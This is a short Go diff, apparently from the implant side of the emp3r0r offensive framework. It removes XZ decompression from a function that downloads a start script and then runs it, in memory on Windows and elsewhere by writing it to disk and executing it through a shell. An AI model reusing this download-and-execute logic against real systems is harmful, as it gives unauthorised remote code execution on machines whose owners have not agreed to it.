@@ -8,7 +8,6 @@ import (
 	"path/filepath"
 	"runtime"
 
-	"github.com/jm33-m0/arc"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -107,16 +106,11 @@ func runStartScript(startScript, modDir string) (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("downloading %s: %w", startScript, err)
 	}
+	scriptData := payload
 
-	// Decompress the payload using XZ
-	decompressedPayload, err := arc.DecompressXz(payload)
-	if err != nil {
-		return "", err
-	}
-
-	log.Printf("Running %s:\n%s...", startScript, decompressedPayload[:100])
+	log.Printf("Running %s:\n%s...", startScript, scriptData[:100])
 	if runtime.GOOS == "windows" {
-		return RunModuleScript(decompressedPayload)
+		return RunModuleScript(scriptData)
 	}
 
 	// otherwise save the file and run it
@@ -130,7 +124,7 @@ func runStartScript(startScript, modDir string) (string, error) {
 	}
 	scriptPath := filepath.Join(modDir, startScript)
 	// write script to file
-	if writeErr := os.WriteFile(scriptPath, decompressedPayload, 0o700); writeErr != nil {
+	if writeErr := os.WriteFile(scriptPath, scriptData, 0o700); writeErr != nil {
 		return "", fmt.Errorf("writing %s: %v", startScript, writeErr)
 	}
 	cmd := exec.Command(emp3r0r_data.DefaultShell, scriptPath)
